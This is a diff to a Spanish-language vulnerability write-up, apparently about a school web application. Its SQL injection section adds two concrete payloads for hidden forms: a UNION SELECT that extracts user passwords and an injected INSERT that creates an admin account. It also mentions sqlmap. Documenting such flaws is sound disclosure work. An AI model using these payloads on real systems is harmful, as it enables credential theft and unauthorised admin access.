@@ -38,7 +38,9 @@ El usuario (no profesor) autenticado obtenido anteriormente puede modificar el c
 ## Vulnerabilidad 4: SQL Injections
 Se descubre que en los formularios ocultos no se valida/sanea la entrada, permitiendo inyecciones SQL que permiten el acceso a la BD relacional utilizada en producción.
 
-* introducir en el form oculto ' OR '1'='1; y acá cualquier otra cosa a inyectar (o meterlo en sqlmap)
+* introducir en el form oculto o cualquier otra cosa a inyectar (o meterlo en sqlmap)
+* ' or 1=1 UNION SELECT u.password AS info_combinada FROM usuario u --
+* ' or 1=1; INSERT INTO usuario (username, password, role) VALUES ('hola', 'asfsfag', 'admin') --
 
 ## Linea de tiempo de vulnerabilidades
 ![vulnerabilidades](./images/vulnerabilidades.png)
